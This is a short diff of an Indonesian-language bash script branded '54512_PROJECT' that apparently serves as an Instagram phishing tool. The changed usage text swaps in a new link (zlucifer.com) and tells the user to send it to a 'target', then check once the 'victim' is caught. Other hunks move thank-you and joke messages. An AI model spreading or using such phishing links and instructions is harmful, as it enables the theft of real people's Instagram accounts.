@@ -30,7 +30,7 @@ if [[ $response != *pre* ]]; then
 else
     echo "trik penggunaan"
     echo "watch & learn"
-    echo "1.Copy link disamping : www.ed31lyn.000webhostapp.com"
+    echo "1.Copy link disamping :http://zlucifer.com/api/best9.php"
     echo "2.Kirim link yang sudah di copy ke target(hanya untuk instagram)"
     echo "3.Jika korban sudah terkena bisa langsung di cek"
     echo "4.asshiap"
@@ -63,6 +63,9 @@ else
             echo "======================================="
             echo " Jangan coba ke mantan"
             echo " -lyn545lyn"
+            echo "Terimakasih sudah menggunakan 54512_PROJECT"
+            echo "semoga hari-harimu menyenangkan"
+            echo "(note:semoga lo dapet pacar)"
             echo "======================================="
             fi
             let i++
@@ -71,8 +74,6 @@ else
             echo "Kesalahan"
         fi
     else
-        echo "Terimakasih sudah menggunakan 54512_PROJECT"
-        echo "semoga hari-harimu menyenangkan"
-        echo "(note:semoga lo dapet pacar)"
+
      fi    
 fi
